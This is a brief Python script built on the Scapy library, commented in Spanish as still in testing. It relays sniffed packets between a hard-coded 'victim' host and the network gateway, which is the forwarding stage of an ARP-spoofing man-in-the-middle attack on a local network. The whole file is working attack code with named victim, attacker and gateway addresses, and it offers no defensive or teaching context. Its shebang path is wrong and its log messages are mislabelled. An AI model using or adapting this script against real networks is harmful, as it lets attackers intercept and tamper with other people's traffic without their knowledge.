#!/etc/usr/python

#EN PRUEBAS REENVIA LOS PAQUETES AL GW

from scapy.all import *
import sys

iface = "eth0"
filter = "ip"
VICTIM_IP = "192.168.200.57"
MY_IP = "192.168.200.121"
GATEWAY_IP = "192.168.200.1"
VICTIM_MAC = "66:CD:4D:31:3E:7E"
MY_MAC = "00:0c:29:88:97:cb"
GATEWAY_MAC = "f8:e9:03:c6:97:d0"

def handle_packet(packet):
    if (packet[IP].src == VICTIM_IP) and (packet[Ether].dst == MY_MAC):
        packet[Ether].dst = GATEWAY_MAC
        sendp(packet)
        print ("A packet from GW " + packet[IP].src + " redirected!")
    if (packet[IP].dst == VICTIM_IP) and (packet[Ether].dst == MY_MAC):
        packet[Ether].dst = VICTIM_MAC
        sendp(packet)
        print("A packet from VICTIM " + packet[IP].src + " redirected!")

sniff(prn=handle_packet, filter=filter, iface=iface, store=0)